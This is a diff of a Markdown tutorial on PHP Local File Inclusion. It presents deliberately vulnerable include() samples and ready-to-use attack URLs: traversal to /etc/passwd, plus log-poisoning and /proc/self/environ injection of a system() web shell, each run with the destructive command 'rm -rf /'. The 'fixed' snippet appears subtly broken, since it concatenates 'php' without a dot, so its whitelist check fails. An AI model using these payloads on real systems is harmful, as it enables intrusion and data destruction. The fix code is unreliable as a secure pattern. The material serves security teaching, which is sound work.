@@ -47,7 +47,7 @@ include $theme.'.php';
 test_fixed.php
 ```php
 <?php
-$allowedThemes = array('pink', 'black');
+$allowedThemes = array('pink.php', 'black.php');
 $theme = $_GET['theme'].'php';
 if(in_array($theme, $allowedThemes) && file_exists($theme)){
     include $theme;
@@ -60,4 +60,52 @@ if(in_array($theme, $allowedThemes) && file_exists($theme)){
 - include
 - include_once
 
-		
+##1) Local File Inclusion
+######Basic examples
+
+test.php
+```php
+<?php
+$theme = 'themes/'.$_GET['theme'];
+include $theme;
+?>
+```
+test1.php
+```php
+<?php
+$theme = 'themes/'.$_GET['theme'];
+include $theme.'.php';
+?>
+```
+######Attack
+- Reading Local Filesystem File:
+	- http://localhost/lfi/index.php?theme=../../../../../../../../../../../../../../etc/passwd
+- Uploading PHP Shell:
+	- Exploiting Apache Access Log
+		- http://localhost/<?php system($_GET['cmd']); ?>
+		- http://localhost/lfi/index.php?theme=../../../../../../../../../../../../../../var/log/apache2/access.log&cmd=rm -rf /
+	- proc/self/environ method
+		- Tamper http User-Agent into <?php system($_GET['cmd']); ?>
+		- http://localhost/lfi/index.php?theme=../../../../../../../../../../../../../../proc/self/environ&cmd=rm -rf /
+
+######How to fix
+- Validate with array of allowed files
+- Don't allow special chars in variables
+- filter the dot "." and slash "/"
+- filter "http" , "https" , "ftp" and "smb"
+
+test_fixed.php
+```php
+<?php
+$allowedThemes = array('pink.php', 'black.php');
+$theme = $_GET['theme'].'php';
+if(in_array($theme, $allowedThemes) && file_exists($theme)){
+    include 'themes/'.$theme;
+}
+?>
+```
+######Affected PHP Functions
+- require
+- require_once
+- include
+- include_once
